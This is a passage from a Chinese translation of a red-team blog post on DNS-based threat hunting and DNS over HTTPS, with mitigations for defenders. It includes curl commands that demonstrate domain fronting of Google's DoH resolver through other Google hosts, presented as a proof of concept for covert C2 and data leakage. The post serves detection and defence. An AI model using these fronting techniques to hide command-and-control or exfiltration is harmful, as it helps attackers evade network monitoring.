<p>回到&quot;LAME技术，通信确实已加密，但是如上所述，我们可以看到未在SSL / TLS初始通信（Client Hello ）中加密的证书详细信息，其中包括i.a.域（如上所述，<code>tls .handshake.extensions_server_name</code> 在Wireshark中显示过滤器）。现在我们看到一个外部域，该域用于在LAN中的两个（或多个）主机之间进行通信，并带有一个解析为LAN IP的DNS查询，这是否可疑？是的，是的，它是最简单的基于DNS的检测规则之一。总之，该技术的作者写道：“ 这可以用作隐蔽的横向移动技术，它绕过了入侵检测/监视工具。”</p>
<p>但实际上，它使检测更加有效，因为当公司执行威胁搜寻时，通常将基于DNS的检测用作最简单的威胁搜寻技术，不需要大量投资。更不用说实际上使用这种技术可以触发IDS警报，并且当我们根本不使用它时，与使事情变得更加艰难时相比，检测风险可能更低……简单的解决方案最有效。即使当我们进行红色团队合作或恶意软件参与者进行攻击时，即使是纯文本通信，较简单的事情，较少的不常见流量等也使得更难检测到。让我们记住，通常在LAN中，系统管理员正在通过<strong>IP</strong>或使用内部<strong>TLD域</strong>与服务器进行通信（例如server.redteam ，没有TLD“redteam ”，但我们可以在内部网络中拥有任何我们想要的TLD，并且它仅适用于使用内部DNS服务器的计算机。系统管理员使用外部域（不属于组织的域）进行任何内部HTTPS通信的次数为零？我个人从未遇到过这种方法。</p>
<h1 id="通过域前端绕过DoH检测"><a href="#通过域前端绕过DoH检测" class="headerlink" title="通过域前端绕过DoH检测"></a>通过域前端绕过DoH检测</h1><p>问题在于，还存在一种称为“<a href="https://en.wikipedia.org/wiki/Domain_fronting" target="_blank" rel="noopener">Domain_fronting</a>”的技术，该技术可用于绕过Internet审查，但也可用于恶意通信：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H &apos;Host: dns.google.com&apos; &apos;https://google.com/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: true,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 20794,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>在Wireshark中，此类流量如下所示</p>
<p><img src="https://1.bp.blogspot.com/-i12t5R7tCUM/XL86O3YoeNI/AAAAAAABqWY/u3rcWeFMYWMyWxSBqBLTjxqmsGAhMXvNwCEwYBhgL/s1600/doh-domainfront-wireshark.png" alt="img"></p>
<p>当有人使用网络浏览器查询Google时，这看起来像是正常的互联网流量。看起来很正常，但不必一定要关注细节，即来自Web浏览器的真实通信情况。我们可以算握手，大小，请求之间的时间，序列与其他主机一样consent.google.com ，<a href="http://www.gstatic.com" target="_blank" rel="noopener">www.gstatic.com</a> ，adservice.google.com 等。请注意，恶意的行为也可以做一个正常的更先进的模拟用户行为。由于威胁行为者可以使用常规的用户行为模拟来传输更多数据，这可能成为一个永无止境的故事，因为Domain_fronting可以用于所有可能的Google主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ host -t A google.com</span><br><span class="line">google.com has address 172.217.16.46</span><br><span class="line">$ host -t A dns.google.com</span><br><span class="line">dns.google.com has address 216.58.215.78</span><br><span class="line">$ curl -H &apos;Host: dns.google.com&apos; &apos;https://google.com/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: true,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 8436,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br><span class="line">$ curl -k -H &apos;Host: dns.google.com&apos; &apos;https://172.217.16.46/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: true,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 8369,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br><span class="line">$ curl -k -H &apos;Host: dns.google.com&apos; &apos;https://216.58.215.78/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: true,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 8361,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">$ host -t A adservice.google.com</span><br><span class="line">adservice.google.com is an alias for pagead46.l.doubleclick.net.</span><br><span class="line">pagead46.l.doubleclick.net has address 172.217.20.194</span><br><span class="line">$ curl -k -H &apos;Host: dns.google.com&apos; &apos;https://172.217.20.194/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: false,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 10967,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">$ host -t A google.pl</span><br><span class="line">google.pl has address 172.217.16.35</span><br><span class="line">$ curl -k -H &apos;Host: dns.google.com&apos; &apos;https://172.217.16.35/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: false,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 21019,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">$ host -t A blogger.com</span><br><span class="line">blogger.com has address 172.217.20.201</span><br><span class="line">$ curl -k -H &apos;Host: dns.google.com&apos; &apos;https://172.217.20.201/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: false,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 21554,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">Full PoC (Proof of Concept) with domain fronting:</span><br><span class="line"></span><br><span class="line">$ curl -H &apos;Host: dns.google.com&apos; &apos;https://blogger.com/resolve?name=redteam.pl&amp;type=A&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: false,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;redteam.pl.&quot;,&quot;type&quot;: 1&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;redteam.pl.&quot;,&quot;type&quot;: 1,&quot;TTL&quot;: 8615,&quot;data&quot;: &quot;104.248.133.95&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://4.bp.blogspot.com/-iCRrXACsINY/XL-DNGbZ5JI/AAAAAAABqY0/9eMUMa4p9rQ-74u9KXOgMBAJVH4KqFKAwCLcBGAs/s1600/doh-blogger_com-domain_fronting-wireshark.png" alt="img"></p>
<p>区分正常流量与恶意流量的另一个问题是，例如<a href="https://wiki.mozilla.org/Trusted_Recursive_Resolver" target="_blank" rel="noopener">Firefox</a>允许用户使用DoH ，默认情况下，该DoH 与mozilla.cloudflare-dns.com 通信。目前，还有更多的<a href="https://github.com/curl/curl/wiki/DNS-over-HTTPS" target="_blank" rel="noopener">DoH服务</a>，将来我们应该有更多可用的服务。</p>
<p># </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从一方面来说，当采用诸如DoH之类的解决方案时，对于用户隐私而言更好，另一方面，使用ia DLP（数据泄漏防护）工具来检测泄漏更困难。这也表明，诸如DNS防火墙之类的产品不足以使组织抵御黑客攻击。威胁执行者仍然可以在<strong>恶意软件中使用硬编码域或DGA</strong>，但使用DoH时，今天的DNS防火墙解决方案将无法检测到它。当前，当攻击者使用他自己的DNS服务器并且流量未加密时，我们可以通过对DNS相关的网络流量进行额外检查来简单地检测到它，而不仅是我们服务中的DNS查询/日志。通过DoH，我们将看到与google.com的HTTPS通信，<strong>甚至不知道这是DNS查询</strong>。<strong>这不仅是发送隐藏的DNS查询的方法，还是一种在不被检测到的情况下将数据泄漏到组织网络外部的好方法</strong>。需要进行真正的威胁搜寻，而不仅仅是使用带有流行词的广告产品。检测需要基于“痛苦金字塔”顶部的知识-战术，技术和程序（TTP）。威胁猎手需要像高技能的威胁行为者那样思考，不仅要检测众所周知的通用技术，而这些技术通常仅由技能低下的攻击者（例如脚本小子）使用。</p>
<p>如果红队想要跟上并执行可能无法发现的攻击模拟，则威胁猎人需要具有与红队类似的技能，反之亦然。上面提到了如何不进行攻击模拟的好例子“ LAME”技术–听起来不错，但实际上，与没有使用这种技术且攻击者不对内部网络中的通信进行加密的情况相比，它使检测更加容易。大多数组织不存储LAN流量，但是即使它们被存储，这也意味着不会被检测到（成功攻击），而留下更多的取证伪像，而我们主要是在谈论后开采和横向移动伪像，这很可能会没有连接到任何外部资源-您将选择哪种方法作为攻击者，留下更多的法证证据或能够在持续的交战中不被发现的情况下成功进行攻击？将DoH与域前端配合使用会在实际环境中为检测带来实际问题，实际上，仅仅是因为有可能通过受信任的供应商作为代理建立恶意通信。我们可以检查时间（工作时间以外），比较请求之间的时间，等等，但是只是针对DoH没有明显的警报，而不会遇到很多误报。无论如何，威胁搜寻并不是要检测所有事物，它应该触发绝不是误报的警报，它应该检测攻击的某些阶段，但由于计算能力强并且具有更多的误报，因此不需要检测全部，以找到真正的进攻。</p>
<p><strong>缓解措施</strong></p>
<ul>
<li>阻止或更积极地监视通过HTTPS（DoH）终结点的DNS流量。如果希望从DoH提供的某些安全优势中受益，请推出内部DoH，基于TLS的DNS（DoT）解析器和/或在组织的最外部DNS服务器上执行安全的DNS解析。</li>
<li>在可能的情况下，检查基础的HTTP交换以获取DoH使用的指示符，而将TLS剥离以进行组织内部检查。即<code>application/dns-json</code>，<code>application/dns-message</code>内容类型。</li>
<li>以相同的方式，查找“Domain Fronting”的潜在指示符，由此传出TLS连接主机名与基础HTTP主机标头不匹配。</li>
<li>将基于启发式或基于异常的数据包大小，频率和容量，基于时间的生活模式检测应用于传出流量。</li>
<li>防御者正在考虑可能无法进行TLS剥离的其他潜在检测，包括使用诸如<a href="https://github.com/salesforce/ja3" target="_blank" rel="noopener">JA3之类</a>的工具对SSL客户端行为中的任何可观察特征进行指纹识别。</li>
</ul>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
<li><p><a href="https://developers.google.com/speed/public-dns/docs/dns-over-https" target="_blank" rel="noopener">https://developers.google.com/speed/public-dns/docs/dns-over-https</a></p>
</li>
<li><p><a href="https://developers.cloudflare.com/1.1.1.1/dns-over-https/json-format/" target="_blank" rel="noopener">https://developers.cloudflare.com/1.1.1.1/dns-over-https/json-format/</a></p>
</li>
<li><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/doh-dns-over-https-poses-possible-risks-to-enterprises/" target="_blank" rel="noopener">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/doh-dns-over-https-poses-possible-risks-to-enterprises/</a></p>
</li>
<li><p><a href="https://github.com/SpiderLabs/DoHC2/blob/master/Mitre_Attackcon_Playing_Devils_Advocate_With_Attack_1.0.pdf" target="_blank" rel="noopener">https://github.com/SpiderLabs/DoHC2/blob/master/Mitre_Attackcon_Playing_Devils_Advocate_With_Attack_1.0.pdf</a></p>
</li>
<li><p><a href="https://dtm.uk/playing-with-dns-over-https/" target="_blank" rel="noopener">https://dtm.uk/playing-with-dns-over-https/</a></p>
</li>
</ul>
<p>原文：<a href="https://blog.redteam.pl/2019/04/dns-based-threat-hunting-and-doh.html" target="_blank" rel="noopener">https://blog.redteam.pl/2019/04/dns-based-threat-hunting-and-doh.html</a></p>

    </div>

    
    
    

    <div>
    
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

    
    </div>
      <div>
        

<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Wh0ale</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://wh0ale.github.io/2020/01/17/DNS-over-HTTPS/" title="DNS over HTTPS">https://wh0ale.github.io/2020/01/17/DNS-over-HTTPS/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>

    <footer class="post-footer">
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
              <a href="/2020/01/06/hackthebox-Craft/" rel="next" title="hackthebox-Craft">
                <i class="fa fa-chevron-left"></i> hackthebox-Craft
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
              <a href="/2020/01/28/hackthebox-Player/" rel="prev" title="hackthebox Player">
                hackthebox Player <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
    </footer>
  </div>
  
  
  
  </article>

  </div>


          </div>
          
    
    <div class="comments" id="gitalk-container"></div>
  


        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image"
      src="/images/avatar.gif"
      alt="Wh0ale">
  <p class="site-author-name" itemprop="name">Wh0ale</p>
  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">131</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
          
            <a href="/categories/">
          
        
        
        
          
        
          
        
          
        
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-tags">
        
          
            <a href="/tags/">
          
        
        
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">61</span>
        <span class="site-state-item-name">标签</span>
        </a>
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
      </span>
    
  </div>
  <div class="cc-license motion-element" itemprop="license">
    
  
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



        </div>
      </div>
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于当前常用检测方法"><span class="nav-number">1.</span> <span class="nav-text">关于当前常用检测方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS-over-HTTPS（DoH）作为C2通信的通道"><span class="nav-number">2.</span> <span class="nav-text">DNS over HTTPS（DoH）作为C2通信的通道</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#通过域前端绕过DoH检测"><span class="nav-number">3.</span> <span class="nav-text">通过域前端绕过DoH检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">23:24</span>
</div>

<div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("03/31/2019 00:00:00");
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  
    <span class="post-meta-divider">|</span>
  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  
    
    
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/jquery/index.js?v=3.4.1"></script>
  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
  <script src="/lib/reading_progress/reading_progress.js"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  <script src="/js/utils.js?v=7.3.0"></script>
  <script src="/js/motion.js?v=7.3.0"></script>

  
  <script src="/js/affix.js?v=7.3.0"></script>
  <script src="/js/schemes/pisces.js?v=7.3.0"></script>



  
  <script src="/js/scrollspy.js?v=7.3.0"></script>
<script src="/js/post-details.js?v=7.3.0"></script>



  <script src="/js/next-boot.js?v=7.3.0"></script>

  

  

  


  























  <script src="/js/local-search.js?v=7.3.0"></script>













    
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>

<script>
  var gitalk = new Gitalk({
    clientID: '925b9aa350afc793e04c',
    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
    repo: 'Wh0ale.github.io',
    owner: 'Wh0ale',
    admin: ['Wh0ale'],
    id: md5(location.pathname),
      language: window.navigator.language || window.navigator.userLanguage,
    
    distractionFreeMode: 'true'
  });
  gitalk.render('gitalk-container');
</script>


</body>
</html>
